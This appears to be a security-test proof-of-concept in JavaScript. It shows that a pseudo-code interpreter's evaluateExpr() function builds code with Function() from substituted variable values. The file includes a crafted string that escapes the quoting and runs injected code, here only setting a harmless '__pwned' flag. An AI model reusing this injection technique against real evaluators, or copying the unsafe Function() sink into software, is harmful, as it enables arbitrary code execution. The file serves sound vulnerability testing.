// PoC: pseudoExecutor.js evaluateExpr() uses Function() on substituted input.
// Reproduces src/utils/pseudoExecutor.js:34-75 verbatim logic.
// Run: node security-tests/poc-function-sink.js

const variables = { name: 'Kamal' };

const evaluateExpr = (expr) => {
    let evalStr = expr;
    const keys = Object.keys(variables).sort((a, b) => b.length - a.length);
    for (const key of keys) {
        const val = variables[key];
        const regex = new RegExp(`\\b${key}\\b`, 'g');
        if (typeof val === 'string') {
            evalStr = evalStr.replace(regex, `'${val}'`);
        } else {
            evalStr = evalStr.replace(regex, val);
        }
    }
    evalStr = evalStr.replace(/MOD/gi, '%');
    evalStr = evalStr.replace(/AND/gi, '&&');
    evalStr = evalStr.replace(/OR/gi, '||');
    evalStr = evalStr.replace(/NOT/gi, '!');
    evalStr = evalStr.replace(/==/g, '===');
    evalStr = evalStr.replace(/<>/g, '!==');
    return Function('"use strict";return (' + evalStr + ')')();
};

console.log('benign :', evaluateExpr("name == 'Kamal'"));

// Simulates a hostile INPUT value if pseudo-code INPUT ever accepts free text.
// Injection lands inside `return (<expr>)`, so the payload must be an expression:
//   -> 'x'+IIFE+'' === 'Kamal'  evaluates the IIFE.
variables.name = "x'+(()=>{globalThis.__pwned='PWNED';return 'y'})()+'";
try { evaluateExpr("name == 'Kamal'"); } catch (e) { console.log('threw:', e.message); }
console.log('hostile: __pwned =', globalThis.__pwned);
